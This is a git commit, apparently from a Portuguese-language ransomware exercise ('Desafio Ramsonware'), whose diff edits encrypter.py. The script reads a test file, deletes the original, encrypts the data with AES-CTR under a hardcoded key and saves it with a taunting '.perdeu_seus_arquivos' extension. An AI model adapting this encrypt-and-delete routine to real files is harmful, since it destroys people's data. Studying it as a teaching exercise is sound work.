3bf1ca4992dbd4b244476d022b4c98a16bf45b8f
DennisMachado <63177756+DennisMachado@users.noreply.github.com>
2024-01-07 09:52:47 -0300

    Desafio Ramsonware

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,31 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
+
+## Abrir o arquivo a ser criptografado
+
 file_name = "teste.txt"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+## Remover o arquivo
+
 os.remove(file_name)
 
-## chave de criptografia
+## Chave de criptografia
+
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+
+## Criptografar o arquivo
+
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+## Salvar o arquivo criptografado
+
+new_file = file_name + ".perdeu_seus_arquivos"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
